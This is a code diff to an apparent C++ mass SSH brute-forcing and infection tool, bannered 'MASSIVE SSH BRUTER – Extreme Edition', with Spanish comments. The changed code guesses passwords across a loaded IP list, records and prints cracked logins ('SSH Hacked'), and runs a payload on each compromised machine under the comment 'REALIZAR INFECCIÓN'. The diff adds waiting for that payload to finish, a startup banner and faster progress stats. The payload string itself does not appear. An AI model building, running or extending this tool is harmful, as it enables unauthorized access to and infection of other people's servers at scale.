@@ -80,6 +80,11 @@ void log(short int tipo, string texto)
     {
         cerr << "[!] " + texto << endl;
     }
+
+    if (tipo == 3)
+    {
+        cout << texto << endl;
+    }
 }
 
 
@@ -171,6 +176,7 @@ void conectarEinfectar(short int hilo, short int usuario)
                 if (estado == SSH_AUTH_SUCCESS)
                 {
                     guardarIps(string(credencialesUsuarios[usuario] + "@" + ipUsar + " " +  credencialesContra[c1]));
+                    log(1, "SSH Hacked | " + credencialesUsuarios[usuario] + "@" + ipUsar + " " + credencialesContra[c1]);
 
 
                     // REALIZAR INFECCIÓN
@@ -182,6 +188,22 @@ void conectarEinfectar(short int hilo, short int usuario)
                         if (estado == SSH_OK) 
                         {
                             ssh_channel_request_exec(terminal, payload.c_str());
+
+
+                            // ESPERAR EJECUCIÓN
+                            int respuesta;
+                        
+                            do 
+                            {
+                                char buffer[256];
+                                respuesta = ssh_channel_read(terminal, buffer, sizeof(buffer), 0);
+
+                                if (respuesta < 0) 
+                                {
+                                    log(2, "Ha ocurrido un error al infectar la máquina.");
+                                }
+                            } 
+                            while (respuesta > 0);
                         }
 
                         else 
@@ -195,7 +217,7 @@ void conectarEinfectar(short int hilo, short int usuario)
                         log(2, "Ha ocurrido un error al infectar la máquina.");
                     }
 
-                        
+
                     // DESCONECTARSE
                     ssh_channel_send_eof(terminal);
                     ssh_channel_close(terminal);
@@ -226,7 +248,7 @@ void stats()
     while (true)
     {
         log(0, "IPs: " + to_string(ips/8) + "/" + to_string(cargados) + " | Attempts: " + to_string(intentos) + " | Bruted: " + to_string(bruteados));
-        this_thread::sleep_for(chrono::minutes(1));
+        this_thread::sleep_for(chrono::seconds(5));
     }
 }
 
@@ -248,6 +270,24 @@ int main(int argc, char* argv[])
 
 
 
+    // INICIO
+    log(3, "\n|------------------------------|");
+    log(3, "|      MASSIVE SSH BRUTER      |");
+    log(3, "| - v1.1                       |");
+    log(3, "| - By samuel9221991           |");
+    log(3, "| - Extreme Edition            |");
+    log(3, "|------------------------------|\n");
+
+
+
+    // INFORMACIÓN
+    log(3, "          INFORMATION          ");
+    log(3, "| - IPs: " + to_string(cargados));
+    log(3, "|                              ");
+    log(3, "| - Payload: " + payload + " \n");
+
+
+
     // INICIAR THREADS
     vector<thread> threads;
     size_t usuarios = sizeof(credencialesUsuarios) / sizeof(credencialesUsuarios[0]);
@@ -263,7 +303,7 @@ int main(int argc, char* argv[])
         }
     }
 
-    log(1, "All threads have been started successfully.");
+    log(1, "All threads have been started successfully.\n");
 
 
     thread stats_T(stats);
